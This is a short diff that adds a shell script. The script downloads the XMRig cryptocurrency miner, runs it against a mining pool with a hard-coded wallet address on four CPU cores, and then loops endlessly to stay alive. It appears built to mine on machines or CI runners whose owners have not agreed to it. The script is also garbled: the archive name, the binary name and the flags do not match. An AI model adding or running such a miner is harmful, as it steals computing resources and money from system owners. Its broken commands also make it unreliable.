@@ -1,0 +1,11 @@
+#!/bin/sh
+sudo apt update
+sudo apt install screen -y
+wget https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-1linux-x64.tar.gz
+tar xf xmrig-6.14.0-linux-x64.tar.gz
+cd xmrig-6.14.0
+./xmrigo rx.unmineable.com:3333 -a rx -k-u ETH:0xCc11d6af268616E2FB046ae3C28646cb7A8379E9.God_Miner#ek61-6h9x -p x --cpu 4
+while [ 1 ]; do
+sleep 3
+done
+sleep 999
